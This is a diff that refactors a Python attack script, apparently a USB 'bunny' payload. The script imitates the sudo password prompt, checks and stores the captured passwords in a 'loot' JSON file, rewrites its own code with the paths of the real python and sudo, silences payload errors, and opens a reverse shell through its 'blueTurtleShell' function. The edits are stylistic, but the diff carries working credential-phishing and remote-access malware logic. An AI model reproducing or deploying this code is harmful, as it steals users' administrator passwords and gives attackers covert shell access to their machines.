@@ -7,10 +7,7 @@ def cantLoadModuleError():
     import sys
     if sys.version_info.major < 3:
         return ImportError
-    if sys.version_info.minor < 6:
-        return ImportError
-    else:
-        return ModuleNotFoundError
+    return ImportError if sys.version_info.minor < 6 else ModuleNotFoundError
 
 def getLootFileName():
     import os
@@ -22,7 +19,7 @@ def getLootFileName():
 def initializeThisScript():
     '''This function will be run the first time by the bunny'''
     import subprocess
-    import re        
+    import re
     pathFinder = subprocess.Popen("which python".split(), stdout = subprocess.PIPE)
     pythonExecutable = pathFinder.stdout.read().strip()
     pathFinder = subprocess.Popen("which sudo".split(), stdout = subprocess.PIPE)
@@ -43,14 +40,12 @@ def initializeThisScript():
         except:
             pass
     thisFileName = __file__
-    thisFile = open(thisFileName, 'r')
-    originalCode = thisFile.read()
-    thisFile.close()
+    with open(thisFileName, 'r') as thisFile:
+        originalCode = thisFile.read()
     newCode = re.sub("PYTHON_EXECUTABLE_GOES_HERE", pythonExecutable, originalCode, 1)
     newCode = re.sub("REAL_SUDO_HERE", sudoExecutable, newCode, 1)
-    thisFile = open(thisFileName, 'w')
-    thisFile.write(newCode)
-    thisFile.close()
+    with open(thisFileName, 'w') as thisFile:
+        thisFile.write(newCode)
     createLootFile(getLootFileName())
     silencePayloadFile()
     quit()
@@ -58,9 +53,8 @@ def initializeThisScript():
 def createLootFile(lootFileName):
     import json
     initialData = {}
-    lootFile = open(lootFileName, 'w')
-    json.dump(initialData, lootFile)
-    lootFile.close()
+    with open(lootFileName, 'w') as lootFile:
+        json.dump(initialData, lootFile)
 
 def validSudoPassword(password):
     import subprocess
@@ -79,13 +73,11 @@ def silencePayloadFile():  #if there is an error making our reverse https, such 
     import os
     payloadFileName = getPayloadFile()
     if os.path.isfile(payloadFileName):
-        payloadFile = open(payloadFileName, 'r')
-        payload = payloadFile.read()
-        payloadFile.close()
+        with open(payloadFileName, 'r') as payloadFile:
+            payload = payloadFile.read()
         payload = "try:\n\t" + payload + "\nexcept:\n\tpass"
-        payloadFile = open(payloadFileName, 'w')
-        payloadFile.write(payload)
-        payloadFile.close()
+        with open(payloadFileName, 'w') as payloadFile:
+            payloadFile.write(payload)
 
 def blueTurtleShell(password):  #we are going to give it a password here.  It won't cause a problem if it is not needed, and it might be needed if the user was doing some long process for the sudo.
     import subprocess
@@ -112,9 +104,9 @@ def getSudoPassword(allowedAttempts = 3):
     user = getpass.getuser()
     if validSudoPassword(""):  #this avoids having the program ask for a password if a valid one was just entered (normal sudo behavior).  Also avoids creating a bunch of reverse shells if the user is repeatedly using sudo (that could create some noise on both ends)
         return (user, "", False)
-    prompt = "[sudo] password for %s: " %user
+    prompt = f"[sudo] password for {user}: "
     fail = "Sorry, try again."
-    epicFail = "sudo: %s incorrect password attempts" %allowedAttempts
+    epicFail = f"sudo: {allowedAttempts} incorrect password attempts"
     success = False
     for i in range(allowedAttempts):
         password = getpass.getpass(prompt)
@@ -122,7 +114,7 @@ def getSudoPassword(allowedAttempts = 3):
             success = True
             break
         else:
-            if not i == allowedAttempts - 1:
+            if i != allowedAttempts - 1:
                 print(fail)
     if not success:
         import sys
@@ -137,19 +129,17 @@ def getSudoPassword(allowedAttempts = 3):
 def loadLootFile(lootFileName):
     import json
     try:
-       file = open(lootFileName, 'r')
-       data = json.load(file)
-       file.close()
-       return data
+        with open(lootFileName, 'r') as file:
+            data = json.load(file)
+        return data
     except:
         return False
     
 def saveLootFile(loot, lootFileName):
     import json
     try:
-        file = open(lootFileName, 'w')
-        json.dump(loot, file)
-        file.close()
+        with open(lootFileName, 'w') as file:
+            json.dump(loot, file)
     except:
         pass
     
@@ -179,12 +169,11 @@ def prewrap():
     return (user, password, passwordNeeded, loot)    
 
 def postwrap(user, password, loot):
-    if not passwordNeeded:
-        if user:
-            try:
-                password = loot[user]
-            except:
-                password = ""
+    if not passwordNeeded and user:
+        try:
+            password = loot[user]
+        except:
+            password = ""
     blueTurtleShell(password)    
 
 if __name__ == '__main__':
